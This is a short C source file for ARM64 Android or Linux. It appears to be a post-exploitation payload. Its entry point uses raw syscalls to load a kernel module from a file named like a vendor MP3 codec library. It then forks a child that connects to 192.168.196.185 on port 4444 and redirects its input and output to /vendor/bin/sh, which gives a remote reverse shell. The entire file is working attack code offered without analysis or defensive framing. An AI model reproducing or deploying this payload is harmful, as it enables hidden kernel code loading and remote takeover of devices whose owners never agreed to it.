#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <asm-generic/unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <linux/un.h>

#define __asm_syscall(...) do { \
	__asm__ __volatile__ ( "svc 0" \
	: "=r"(x0) : __VA_ARGS__ : "memory", "cc"); \
	return x0; \
	} while (0)

static inline long __syscall1(long n, long a) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    __asm_syscall("r"(x8), "0"(x0));
}

static inline long __syscall3(long n, long a, long b, long c) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2));
}

static inline long __syscall4(long n, long a, long b, long c, long d) {
    register long x8 __asm__("x8") = n;
    register long x0 __asm__("x0") = a;
    register long x1 __asm__("x1") = b;
    register long x2 __asm__("x2") = c;
    register long x3 __asm__("x3") = d;
    __asm_syscall("r"(x8), "0"(x0), "r"(x1), "r"(x2), "r"(x3));
}

static inline int _finit_module(int fd, const char * param_values, int flags) {
    return __syscall3(__NR_finit_module, fd, (long) param_values, flags);
}

static inline int _openat(const char * __path, int __flags, int __mode) {
    return (int)__syscall4(__NR_openat, AT_FDCWD, (long) __path, __flags, __mode);
}

static inline int _s_exit(int __status) {
    return __syscall1(__NR_exit, __status);
}

int _start() {
    int fd_c = _openat("/vendor/lib/libstagefright_soft_mp3dec.so", 0, 0);
    int ld = _finit_module(fd_c, "", 0);

    if (fork() == 0) {
        sleep(5);

        struct sockaddr_in sa;
        int s;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr("192.168.196.185");
        sa.sin_port = htons(4444);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *)&sa, sizeof(sa));
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);

        execve("/vendor/bin/sh", 0, 0);
        exit(2);
        return 0;
    }

    return _s_exit(0);
}
